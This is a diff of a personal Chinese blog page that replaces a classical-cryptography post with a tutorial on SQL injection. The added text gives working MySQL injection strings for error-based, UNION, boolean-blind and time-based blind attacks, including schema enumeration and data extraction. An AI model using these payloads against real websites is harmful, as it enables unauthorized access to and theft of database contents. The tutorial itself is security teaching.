@@ -86,7 +86,7 @@
 
 
 
-  <meta name="keywords" content="密码学," />
+  <meta name="keywords" content="SQL注入," />
 
 
 
@@ -100,16 +100,16 @@
 
 
 <meta name="description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
-<meta name="keywords" content="密码学">
+<meta name="keywords" content="SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="古典密码">
-<meta property="og:url" content="http://wlfsky.com/2017/12/06/古典密码/index.html">
+<meta property="og:title" content="SQL注入技术">
+<meta property="og:url" content="http://wlfsky.com/2018/01/15/SQL注入技术/index.html">
 <meta property="og:site_name" content="清沐园 | wlfsky">
 <meta property="og:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-12-23T05:52:16.812Z">
+<meta property="og:updated_time" content="2018-01-16T15:01:44.164Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="古典密码">
+<meta name="twitter:title" content="SQL注入技术">
 <meta name="twitter:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
 
 
@@ -140,13 +140,13 @@
 
 
 
-  <link rel="canonical" href="http://wlfsky.com/2017/12/06/古典密码/"/>
+  <link rel="canonical" href="http://wlfsky.com/2018/01/15/SQL注入技术/"/>
 
 
 
 
 
-  <title>古典密码 | 清沐园 | wlfsky</title>
+  <title>SQL注入技术 | 清沐园 | wlfsky</title>
   
 
 
@@ -294,7 +294,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wlfsky.com/2017/12/06/古典密码/">
+    <link itemprop="mainEntityOfPage" href="http://wlfsky.com/2018/01/15/SQL注入技术/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wlfsky">
@@ -311,7 +311,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">古典密码</h2>
+          <h2 class="post-title" itemprop="name headline">SQL注入技术</h2>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-06T19:26:40+08:00">
-                2017-12-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-15T13:05:33+08:00">
+                2018-01-15
               </time>
             
 
@@ -339,8 +339,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2017-12-23T13:52:16+08:00">
-                2017-12-23
+              <time title="更新于" itemprop="dateModified" datetime="2018-01-16T23:01:44+08:00">
+                2018-01-16
               </time>
             
           </span>
@@ -358,8 +358,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/密码学/" itemprop="url" rel="index">
-                    <span itemprop="name">密码学</span>
+                  <a href="/categories/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
                   </a>
                 </span>
 
@@ -394,7 +394,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2,092
+                  1,943
                 </span>
               
 
@@ -435,124 +435,179 @@
 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
 </code></pre><a id="more"></a>
 <hr>
-<h3 id="古典密码的分类"><a href="#古典密码的分类" class="headerlink" title="古典密码的分类"></a>古典密码的分类</h3><ul>
-<li>棋盘密码</li>
-<li>移位密码</li>
-<li>代换密码</li>
-<li>维吉尼亚密码</li>
-<li>仿射密码</li>
-<li>置换密码</li>
-<li>Hill 密码</li>
+<h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><h4 id="SQL注入基本介绍"><a href="#SQL注入基本介绍" class="headerlink" title="SQL注入基本介绍"></a>SQL注入基本介绍</h4><p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
+<p>SQL注入是一种常见的WEB安全漏洞，攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p>
+<h4 id="SQL注入产生的原因"><a href="#SQL注入产生的原因" class="headerlink" title="SQL注入产生的原因"></a>SQL注入产生的原因</h4><p>针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：</p>
+<ol>
+<li><p>程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句</p>
+</li>
+<li><p>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</p>
+</li>
+</ol>
+<h3 id="SQL注入攻击方式"><a href="#SQL注入攻击方式" class="headerlink" title="SQL注入攻击方式"></a>SQL注入攻击方式</h3><p>SQL注入的攻击方式分为以下五种：</p>
+<ol>
+<li>Error-based SQL injection（报错型注入又称错误回显注入）</li>
+<li>UNION query SQL injection（可联合查询注入）</li>
+<li>Stacked queries SQL injection（可多语句查询注入）</li>
+<li>Boolean-based blind SQL injection（布尔型注入）</li>
+<li>Time-based blind SQL injection（基于时间延迟注入）</li>
+</ol>
+<h3 id="如何进行SQL注入攻击"><a href="#如何进行SQL注入攻击" class="headerlink" title="如何进行SQL注入攻击"></a>如何进行SQL注入攻击</h3><h4 id="SQL注入攻击中常用的一些参数"><a href="#SQL注入攻击中常用的一些参数" class="headerlink" title="SQL注入攻击中常用的一些参数"></a>SQL注入攻击中常用的一些参数</h4><blockquote>
+<p>user(): 当前数据库的用户<br>database(): 当前使用的数据库<br>version(): 当前使用的数据库的版本<br>@@datadir: 数据库路径<br>@@basedir: 获取安装路径<br>concat()和concat_ws(): 联合数据<br>group_concat(): 多条数据连接<br>hex()和unhex(): 对数据进行hex编码解码<br>load_file(): 这是MYSQL以文本方式读取文件的参数</p>
+</blockquote>
+<h4 id="SQL注入攻击的步骤"><a href="#SQL注入攻击的步骤" class="headerlink" title="SQL注入攻击的步骤"></a>SQL注入攻击的步骤</h4><h5 id="Error-based-SQL-injection"><a href="#Error-based-SQL-injection" class="headerlink" title="Error-based SQL injection"></a>Error-based SQL injection</h5><ul>
+<li>逻辑错误部分，也就是将GET变量取值变为逻辑错误值，如：id = -1</li>
+<li>固定SQL联合查询语句<ul>
+<li>union select 1 from (select count(*),concat(floor(rand(0)*2),(注入暴数据语句))a from information_schema.tables group by a)b#</li>
 </ul>
-<h4 id="棋盘密码"><a href="#棋盘密码" class="headerlink" title="棋盘密码"></a>棋盘密码</h4><p>​    通过将26个英文字母设法变成十位数来达到加密的目的。棋盘密码的密钥是一个5*5的棋盘，将26个英文字母放置在里面，其中字母i和j被放在同一个方格中，如下表所表示：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center"></th>
-<th style="text-align:center">1</th>
-<th style="text-align:center">2</th>
-<th style="text-align:center">3</th>
-<th style="text-align:center">4</th>
-<th style="text-align:center">5</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center">q</td>
-<td style="text-align:center">w</td>
-<td style="text-align:center">e</td>
-<td style="text-align:center">r</td>
-<td style="text-align:center">t</td>
-</tr>
-<tr>
-<td style="text-align:center">2</td>
-<td style="text-align:center">y</td>
-<td style="text-align:center">u</td>
-<td style="text-align:center">i/j</td>
-<td style="text-align:center">o</td>
-<td style="text-align:center">p</td>
-</tr>
-<tr>
-<td style="text-align:center">3</td>
-<td style="text-align:center">a</td>
-<td style="text-align:center">s</td>
-<td style="text-align:center">d</td>
-<td style="text-align:center">f</td>
-<td style="text-align:center">g</td>
-</tr>
-<tr>
-<td style="text-align:center">4</td>
-<td style="text-align:center">h</td>
-<td style="text-align:center">k</td>
-<td style="text-align:center">l</td>
-<td style="text-align:center">z</td>
-<td style="text-align:center">x</td>
-</tr>
-<tr>
-<td style="text-align:center">5</td>
-<td style="text-align:center">c</td>
-<td style="text-align:center">v</td>
-<td style="text-align:center">b</td>
-<td style="text-align:center">n</td>
-<td style="text-align:center">m</td>
-</tr>
-</tbody>
-</table>
-<h4 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h4><p>​    移位密码的加密对象为英文符号。移位密码采用每一字母向前推移<strong><em>key</em></strong>位的方式实现加密。换句话说，移位密码实现了26个英文字母的循环移位。当<strong><em>key=3</em></strong>时，得到的移位密码称为凯撒密码。</p>
-<blockquote>
-<p><strong>移位密码体制</strong>    令M=C=K=Z<sub>26</sub>。对任意的<em>key</em>∈Z<sub>26</sub>，x∈M，y∈C，定义</p>
-<p>e<sub>key</sub>(x) = (x + key)mod26</p>
-<p>d<sub>key</sub>(y) = (y - key)mod26</p>
-</blockquote>
-<p>移位密码的密钥空间大小为25。</p>
-<h4 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h4><p>​    26个英文字母和Z<sub>26</sub>的元素之间可以建立一个一一对应关系，于是Z<sub>26</sub>上的任一个置换也就对应了26个英文字母表上的一个置换。因此可以借助Z<sub>26</sub>上的置换来改变英文字符的原有位置，已达到加密的目的，Z<sub>26</sub>上的置换看成了加密所需的秘钥。</p>
-<blockquote>
-<p><strong>代换密码体制</strong>    令M=C=Z<sub>26</sub>，K是Z<sub>26</sub>上所有可能置换构成的集合。对任意的置换π∈K，x∈M，y∈C，定义</p>
-<p>e<sub>x</sub> = π(x)</p>
-<p>d<sub>y</sub> = π<sup>-1</sup>(y)</p>
-</blockquote>
-<p>这里π和π<sub>-1</sub>互为逆置换。代换密码的密钥空间为26!。</p>
-<h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>​    维吉尼亚密码是一种多表代换密码。</p>
-<blockquote>
-<p><strong>维吉尼亚密码体制</strong>     令m是一个正整数，相应地定义M=C=K=(Z<sub>26</sub>)<sup>m</sup>。对任意的密钥<em>key</em>=(k<sub>1</sub>，k<sub>2</sub>，···，k<sub>m</sub>)∈K，(x<sub>1</sub>，x<sub>2</sub>，···，x<sub>m</sub>)∈M，(y<sub>1</sub>，y<sub>2</sub>，···，y<sub>m</sub>)∈C，定义</p>
-<p>e<sub>key</sub>(x<sub>1</sub>，x<sub>2</sub>，···，x<sub>m</sub>) = (x<sub>1</sub> + k<sub>1</sub>，x<sub>2</sub> + k<sub>2</sub>，···，x<sub>m</sub> + k<sub>m</sub>)mod26</p>
-<p>d<sub>key</sub>(y<sub>1</sub>，y<sub>2</sub>，···，y<sub>m</sub>) = (y<sub>1</sub> + k<sub>1</sub>，y<sub>2</sub> + k<sub>2</sub>，···，y<sub>m</sub> + k<sub>m</sub>)mod26</p>
-</blockquote>
-<p>维吉尼亚密码的密钥空间大小为26<sup>m</sup>。</p>
-<h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>​    仿射密码是代换密码的一个特例。</p>
-<blockquote>
-<p> <strong>仿射密码体制</strong>    令M=C=Z<sub>26</sub>，K={(k<sub>1</sub>，k<sub>2</sub>)∈Z<sub>26</sub> <em> Z<sub>26</sub> : gcd(k<sub>1</sub>，26) = 1}。对任意的密钥</em>key* = (k<sub>1</sub>，k<sub>2</sub>)∈K，x∈M，y∈C，定义</p>
-<p> e<sub>key</sub>(x) = (k<sub>1</sub>x + k<sub>2</sub>)mod26</p>
-<p> d<sub>key</sub>(y) = k<sub>1</sub><sup>-1</sup>(y - k<sub>2</sub>)mod26</p>
-</blockquote>
-<p>其中， k<sub>1</sub><sup>-1</sup>表示 k<sub>1</sub>在Z<sub>26</sub>中的乘法逆，gcd(k<sub>1</sub>，26) = 1表示 k<sub>1</sub>与26互素。当 k<sub>1</sub> = 1时，仿射密码变成了移位密码。</p>
-<h4 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h4><p>​    通过重新排列消息中元素的位置而不改变元素本身的加密方式。</p>
-<blockquote>
-<p><strong>置换密码体制</strong>    令m ≥ 2 是一个正整数，M=C=(Z<sub>26</sub>)<sup>m</sup>，K是Z<sub>m</sub> = {1，2，···，m}上所有可能置换构成的集合。对任意的(x<sub>1</sub>，x<sub>2</sub>，···，x<sub>m</sub>)∈M，π∈K，y<sub>1</sub>，y<sub>2</sub>，···，y<sub>m</sub>)∈C，定义</p>
-<p>e<sub>π</sub>(x<sub>1</sub>，x<sub>2</sub>，···，x<sub>m</sub>) = (x<sub>π(1)</sub>，x<sub>π(2)</sub>，···，x<sub>π(m)</sub>)</p>
-<p>d<sub>π</sub>(y<sub>1</sub>，y<sub>2</sub>，···，y<sub>m</sub>) = ((y<sub>π(1)</sub>)<sup>-1</sup>，(y<sub>π(2)</sub>)<sup>-1</sup>，···，(y<sub>π(m)</sub>)<sup>-1</sup>)</p>
-</blockquote>
-<p>其中，π和π<sup>-1</sup>互为Z<sub>m</sub>上的逆置换，m称为分组长度。密钥空间为m!。</p>
-<h4 id="Hill-密码"><a href="#Hill-密码" class="headerlink" title="Hill 密码"></a>Hill 密码</h4><p>​    多表代换密码。将明文消息按照步长m进行分组，对每一组的m个明文字母通过线性变换将其转换成m个相应的密文字母。</p>
-<blockquote>
-<p><strong>Hill密码体制</strong>      令m ≥ 2 是一个正整数，M=C=(Z<sub>26</sub>)<sup>m</sup>，K是定义在Z<sub>26</sub>上所有大小为m*m的可逆矩阵的集合。对任意的A∈K，定义</p>
-<p>e<sub>A</sub>(x) = xA mod26</p>
-<p>d<sub>A</sub>(x) = yA<sup>-1</sup> mod26</p>
-</blockquote>
-<p>Hill 密码能够较好地抵御基于字母出现频率的攻击方法。</p>
-<h4 id="常用的密码分析攻击分为以下几类"><a href="#常用的密码分析攻击分为以下几类" class="headerlink" title="常用的密码分析攻击分为以下几类"></a>常用的密码分析攻击分为以下几类</h4><ul>
-<li>唯密文攻击(Ciphertext—only attack)。<br>​    攻击者手中除了截获的密文外，没有其他任何辅助信息。唯密文攻击是最常见的一种密码分析类型，也是难度最大的一种。</li>
-<li>已知明文攻击( Known – plaintext attack)。<br>  攻击者除了掌握密文，还掌握了部分明文和密文的对应关系。举例来看，如果是遵从通信协议的对话，由于协议中使用固定的关键字，如“login”“password”等，通过分析可以确定这关键字对应的密文。如果传输的是法律文件、单位通知等类型的公文，由于大部分公文有固定的格式和一些约定的文字，在截获的公文较多的条件下，可以推测出一些文字、词组对应的密文。</li>
-<li>选择明文攻击( Chosen – plaintext attack)。<br>  攻击者知道加密算法，同时能够选择明文并得到相应明文所对应的密文。这是比较常见的一种密玛分析类型。例如，攻击者截获了有价值的密文，并获取了加密使用设备，向设备中输入任意明文可以得到对应的密文，以此为基础，攻击者尝试对有价值的密文进行破解。选择明文攻击常常被用于破解采用公开密钥密码系统加密的信息内容。</li>
-<li>选择密文攻击( Chosen – ciphertext attack)。<br>  攻击者知道加密算法，同时可以选择密文并得到对应的明文。采用选择密文攻击这种攻击方式，攻击者的攻击目标通常是加密过程使用的密钥。基于公开密钥密码系统的数字签名，容易受到这种类型的攻击。</li>
+</li>
+<li>注释语句，将整个语句后面的部分注释掉<ul>
+<li>利用/* 和 – - 还有 %23 以及 # 来注释</li>
 </ul>
-<h4 id="密码分析过程中采取的方法"><a href="#密码分析过程中采取的方法" class="headerlink" title="密码分析过程中采取的方法"></a>密码分析过程中采取的方法</h4><ul>
-<li>穷举攻击法。<br>  穷举攻击法的破解思路是尝试所有的可能以找出明文或者密钥。穷举攻击法可以划分为穷举密钥和穷举明文两类。穷举密钥是指攻击者依次使用各种可能的解密密钥对截收的密文，进行试译，如果某个解密密钥能够产生有意义的明文，则判断相应的密钥就是正确的解密密钥。穷举明文是指攻击者在保持加密密钥不变的条件下，对所有可能的明文进行加密，如果某段明文加密的结果与截获的密文一致，则判断相应的明文就是发送者发送的信息。<pre><code>　　为了对抗穷举攻击，现代密码系统在设计时往往采用扩大密钥空间或者提高加密、解密算法复杂度的方法。当密钥空间扩大以后，采用穷举密钥的方法，在破解的过程中需要尝试更多的解密密钥；提高加密、解密算法的复杂度，将使攻击者无论采用穷举密钥还是穷举明文的方法对密码系统进行破解，每次破解尝试都需要付出更加高昂的计算开销6对于一个完善的现代密码系统，采用穷举攻击法进行破解需要付出的代价很可能超过密文破解产生的价值。
-</code></pre></li>
-<li>统计分析法。<br>  统计分析法是通过分析明文和密文的统计规律来破解密文的一种方法。一些古典密码系统加密的信息，密文中字母及字母组合的统计规律与明文完全相同，此类密码系统容易被统计分析法破解。统计分析法首先需要获得密文的统计规律，在此基础上，将密文的统计规律与已知的明文统计规律对照比较，提取明、密文的对应关系，进而完成密文破解。<pre><code>　　要对抗统计分析攻击，密码系统在设计时应当着力避免密文和明文在统计规律上存在一致，从而使攻击者无法通过分析密文的统计规律来推断明文内容。
-</code></pre></li>
-<li>数学分析法。<br>  大部分现代密码系统以数学难题作为理论基础。数学分析法是指攻击者针对密码系统的数学基础和密码学特性，利用一些已知量，如一些明文和密文的对应关系，通过数学求解破译密钥等未知量的方法。对于基于数学难题的密码系统，数学分析法是一种重要的破解手段。</li>
+</li>
+<li>注入暴数据语句<ul>
+<li>基本格式为select XX from YY limit 0,1</li>
+<li>只能暴单条数据，所以根据limit来暴</li>
+</ul>
+</li>
+</ul>
+<h5 id="UNION-query-SQL-injection"><a href="#UNION-query-SQL-injection" class="headerlink" title="UNION query SQL injection"></a>UNION query SQL injection</h5><ul>
+<li>判断是否存在注入，注入是字符型还是数字型<ul>
+<li>利用单引号，and 1=1，and 1=2，双引号，反斜杠和注释等判断</li>
+</ul>
+</li>
+<li>猜解SQL查询语句中的字段数<ul>
+<li>利用order by 或者 union select 1,2,3…来猜解字段数</li>
+<li>使用union语句时，将变量取值变为逻辑错误值，如：id=-1</li>
+</ul>
+</li>
+<li>获取当前数据库<ul>
+<li>利用database()来得知当前数据库，利用user()得知当前数据库连接使用的用户，利用version()得知当前数据库的版本</li>
+</ul>
+</li>
+<li>获取数据库中的表名<ul>
+<li>union select group_concat(table_name) from information_schema.tables where table_schema = database() #</li>
+</ul>
+</li>
+<li>获取表中的字段名<ul>
+<li>union select group_concat(column_name) from information_schema.columns where table_name = ‘表名’</li>
+<li>如果单引号被转义，则使用hex()转义绕过</li>
+</ul>
+</li>
+<li>获得数据<ul>
+<li>union select group_concat(字段名) from 表名</li>
+</ul>
+</li>
+</ul>
+<h5 id="Boolean-based-blind-SQL-injection"><a href="#Boolean-based-blind-SQL-injection" class="headerlink" title="Boolean-based blind SQL injection"></a>Boolean-based blind SQL injection</h5><ul>
+<li>判断是否存在注入，注入是字符型还是数据型<ul>
+<li>输入1’ and 1=1 # 显示存在</li>
+<li>输入1’ and 1=2 # 显示不存在，则说明存在字符型的SQL盲注</li>
+</ul>
+</li>
+<li>猜解当前数据库名<ul>
+<li>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符</li>
+<li>输入1’ and length(database())=1 # 显示不存在</li>
+<li>输入1’ and length(database())=2 # 显示不存在，最终得出长度</li>
+<li>然后采用<strong>二分法</strong>猜解数据库名</li>
+<li>substr(string,start,length)</li>
+<li>输入1’ and ascii(substr(database(),1,1))&gt;97 # 显示存在，说明数据库名第一个字符的ascii值大于97</li>
+<li>输入1’ and ascii(substr(database(),1,1))&lt;122 # 显示存在，说明数据库名第一个字符的ascii值小于122</li>
+<li>改变数字重复上述步骤可猜解出数据库名</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>猜解数据库中的表名</p>
+<ul>
+<li>首先猜解数据库中表的数量</li>
+<li>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</li>
+<li>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=2 # 显示存在，则说明数据库中共有两个表</li>
+<li>然后猜解表名长度</li>
+<li>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在 =2…最终得到表名长度</li>
+<li>最后猜解表名</li>
+<li>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在 &lt; 122 最终得到第一个字符，然后2,1…</li>
+</ul>
+</li>
+<li><p>猜解表中的字段名</p>
+<ul>
+<li>首先猜解表中字段的数量</li>
+<li>1’ and (select count (column_name) from information_schema.columns where table_name=’表名’)=1 # 显示不存在</li>
+<li>1’ and (select count (column_name) from information_schema.columns where table_name=’表名’)=2 # 显示存在，则说明表中有2个字段</li>
+<li>然后猜解字段长度</li>
+<li>1’ and length(substr((select column_name from information_schema.columns where table_name=’表名’ limit 0,1),1))=1 # 显示不存在 =2…最终得到字段长度</li>
+<li>最后猜解字段名</li>
+<li>1’ and ascii(substr((select column_name from information_schema.columns where table_name=’表名’ limit 0,1),1,1))&gt;97 # 显示存在，然后采用二分法最终得到字段名</li>
+</ul>
+</li>
+<li><p>猜解数据</p>
+<ul>
+<li><p>猜解数据长度</p>
+</li>
+<li><p>1’ and length(substr((select 字段名 from ‘表名’ limit 0,1),1))=1 # 显示不存在，然后增加等号后面的数字，最终得到数据长度</p>
+</li>
+<li><p>最后猜解数据</p>
+</li>
+<li><p>1’ and ascii(substr((select 字段名 from ‘表名’ limit 0,1),1,1))&gt;97 # 显示存在，然后采用二分法最终得到数据</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="Time-based-blind-SQL-injection"><a href="#Time-based-blind-SQL-injection" class="headerlink" title="Time-based blind SQL injection"></a>Time-based blind SQL injection</h5><ul>
+<li><p>判断是否存在注入，注入是字符型还是数字型</p>
+<ul>
+<li>输入1’ and sleep(5) #，感觉到明显延迟；</li>
+<li>输入1 and sleep(5) #，没有延迟，说明存在字符型的基于时间的盲注。</li>
+</ul>
+</li>
+<li><p>猜解当前数据库名</p>
+<ul>
+<li>首先猜解数据名的长度：</li>
+<li>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</li>
+<li>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</li>
+<li>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</li>
+<li>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</li>
+<li>说明数据库名长度为4个字符。</li>
+<li>接着采用二分法猜解数据库名：</li>
+<li>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</li>
+<li>1’ and if(ascii(substr(database(),1,1))&lt;122,sleep(5),1)# 没有延迟</li>
+<li>重复上述步骤，即可猜解出数据库名。</li>
+</ul>
+</li>
+<li><p>猜解数据库中的表名</p>
+<ul>
+<li>首先猜解数据库中表的数量：</li>
+<li>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</li>
+<li>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</li>
+<li>说明数据库中有两个表。</li>
+<li>接着挨个猜解表名：</li>
+<li>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</li>
+<li>…</li>
+<li>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</li>
+<li>说明第一个表名的长度为9个字符。</li>
+<li>采用二分法即可猜解出表名。</li>
+</ul>
+</li>
+<li><p>猜解表中的字段名</p>
+<ul>
+<li>首先猜解表中字段的数量：</li>
+<li>1’ and if((select count(column_name) from information_schema.columns where table_name= ‘users’)=1,sleep(5),1)# 没有延迟</li>
+<li>…</li>
+<li>1’ and if((select count(column_name) from information_schema.columns where table_name= ‘users’)=8,sleep(5),1)# 明显延迟</li>
+<li>说明users表中有8个字段。</li>
+<li>接着挨个猜解字段名：</li>
+<li>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</li>
+<li>…</li>
+<li>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</li>
+<li>说明users表的第一个字段长度为7个字符。</li>
+<li>采用二分法即可猜解出各个字段名。</li>
+</ul>
+</li>
+<li><p>猜解数据</p>
+<ul>
+<li>同样采用二分法。</li>
+</ul>
+</li>
 </ul>
 
       
@@ -603,7 +658,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://wlfsky.com/2017/12/06/古典密码/" title="古典密码">http://wlfsky.com/2017/12/06/古典密码/</a>
+    <a href="http://wlfsky.com/2018/01/15/SQL注入技术/" title="SQL注入技术">http://wlfsky.com/2018/01/15/SQL注入技术/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -618,7 +673,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/密码学/" rel="tag"><i class="fa fa-tag"></i> 密码学</a>
+            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
           
         </div>
       
@@ -631,8 +686,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/04/2017-12-04/" rel="next" title="终于完工">
-                <i class="fa fa-chevron-left"></i> 终于完工
+              <a href="/2017/12/23/素数-模幂-求逆运算/" rel="next" title="素数-模幂-求逆运算">
+                <i class="fa fa-chevron-left"></i> 素数-模幂-求逆运算
               </a>
             
           </div>
@@ -640,10 +695,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/12/23/仿射密码/" rel="prev" title="仿射密码">
-                仿射密码 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -1048,7 +1099,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#古典密码的分类"><span class="nav-number">1.</span> <span class="nav-text">古典密码的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#棋盘密码"><span class="nav-number">1.1.</span> <span class="nav-text">棋盘密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#移位密码"><span class="nav-number">1.2.</span> <span class="nav-text">移位密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代换密码"><span class="nav-number">1.3.</span> <span class="nav-text">代换密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#维吉尼亚密码"><span class="nav-number">1.4.</span> <span class="nav-text">维吉尼亚密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#仿射密码"><span class="nav-number">1.5.</span> <span class="nav-text">仿射密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#置换密码"><span class="nav-number">1.6.</span> <span class="nav-text">置换密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hill-密码"><span class="nav-number">1.7.</span> <span class="nav-text">Hill 密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用的密码分析攻击分为以下几类"><span class="nav-number">1.8.</span> <span class="nav-text">常用的密码分析攻击分为以下几类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密码分析过程中采取的方法"><span class="nav-number">1.9.</span> <span class="nav-text">密码分析过程中采取的方法</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.</span> <span class="nav-text">什么是SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入基本介绍"><span class="nav-number">1.1.</span> <span class="nav-text">SQL注入基本介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入产生的原因"><span class="nav-number">1.2.</span> <span class="nav-text">SQL注入产生的原因</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入攻击方式"><span class="nav-number">2.</span> <span class="nav-text">SQL注入攻击方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何进行SQL注入攻击"><span class="nav-number">3.</span> <span class="nav-text">如何进行SQL注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入攻击中常用的一些参数"><span class="nav-number">3.1.</span> <span class="nav-text">SQL注入攻击中常用的一些参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入攻击的步骤"><span class="nav-number">3.2.</span> <span class="nav-text">SQL注入攻击的步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Error-based-SQL-injection"><span class="nav-number">3.2.1.</span> <span class="nav-text">Error-based SQL injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UNION-query-SQL-injection"><span class="nav-number">3.2.2.</span> <span class="nav-text">UNION query SQL injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Boolean-based-blind-SQL-injection"><span class="nav-number">3.2.3.</span> <span class="nav-text">Boolean-based blind SQL injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Time-based-blind-SQL-injection"><span class="nav-number">3.2.4.</span> <span class="nav-text">Time-based blind SQL injection</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
